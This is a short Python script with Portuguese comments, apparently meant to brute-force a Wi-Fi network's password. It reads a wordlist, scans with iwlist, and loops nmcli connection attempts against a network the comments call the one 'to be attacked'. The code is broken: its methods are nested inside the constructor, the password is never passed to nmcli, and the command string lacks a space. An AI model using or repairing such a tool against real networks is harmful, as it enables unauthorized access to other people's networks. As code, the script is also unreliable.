import os
import subprocess

class Finder:
    def __init__(self, *args, **kwargs):
        self.server_name = kwargs['server_name']
        self.password = kwargs['password']
        self.interface_name = kwargs['interface']
        self.main_dict = {}

        def run(self):
            name = self.server_name
            try:
                resultado = self.connection(name)
            except Exception as exp:
                print('[-] Senha inválida!')
            else:
                if resultado:
                    print('[+] Sucesso, conectado a {}'.format(name))
                print('----------')
                print(f'[+]Senha encontrada!: {self.password}')
                exit(0)
        
        def connection(self, name):
            try:
                output = subprocess.check_output('nmcli d wifi connect' + self.server_name)

            except:
                raise

            else:
                return True
            
if __name__ == '__main__':
    server_name = 'x' #coloque o nome da rede a ser atacada aqui, dentro da string
    f = open('pwords.txt', 'r') #altere o nome da wordlist, se preciso (caso saiba o que esta fazendo)
    txt = f.read()
    passwords = txt.splitlines()
    output = subprocess.check_output('sudo iwlist wlan0 scan', shell=True)
    print(output)
    interface_name = 'wlan0'
    for password in passwords:
        F = Finder(server_name=server_name, password=password, interface=interface_name)
        F.run()
        
